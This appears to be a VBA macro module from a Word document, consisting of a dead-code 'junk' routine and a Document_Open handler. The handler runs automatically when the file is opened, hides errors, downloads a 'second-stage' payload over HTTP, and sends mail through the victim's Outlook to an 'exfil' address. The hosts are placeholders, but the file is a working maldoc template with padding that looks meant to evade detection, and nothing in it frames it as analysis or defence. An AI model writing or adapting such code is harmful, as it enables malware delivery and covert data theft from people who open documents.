
Public Sub OblivionXJunkRoutine()
    Dim junkcounter As Long
    Dim junktext As String
    If False Then
        junktext = "decoy"
        junkcounter = 1 + 1
    End If
    Dim deadvarunused As Long
    If 1 = 2 Then
        deadvarunused = 999
    End If

End Sub
Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim http As Object, url As String
    Dim olApp As Object, olMail As Object
    On Error Resume Next
    url = "http://127.0.0.1:9090/second-stage.bin"
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", url, False
    http.Send
    Set olApp = CreateObject("Outlook.Application")
    Set olMail = olApp.CreateItem(0)
    olMail.To = "exfil@example.com"
    olMail.Subject = "logs"
    olMail.Body = http.Status
    olMail.Send
End Sub
